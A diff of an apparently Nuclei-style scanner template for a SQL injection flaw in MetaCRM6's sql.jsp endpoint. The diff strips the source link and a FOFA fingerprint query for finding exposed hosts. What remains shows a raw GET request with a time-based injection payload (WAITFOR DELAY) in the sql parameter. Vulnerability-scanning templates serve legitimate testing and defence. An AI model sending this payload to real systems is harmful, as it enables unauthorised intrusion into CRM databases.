@@ -3,12 +3,8 @@ info:
   name: 美特CRM6 sql.jsp 存在SQQ注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kwp5d3qex7tpzzp4'
+  description: ''
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kwp5d3qex7tpzzp4
-    fofa: body="/common/scripts/basic.js" && body="[www.metacrm.com.cn](www.metacrm.com.cn)"
 http:
 - raw:
   - 'GET /common/jsp/sql.jsp?sql=;WAITFOR%20DELAY%20''0:0:5''-- HTTP/1.1
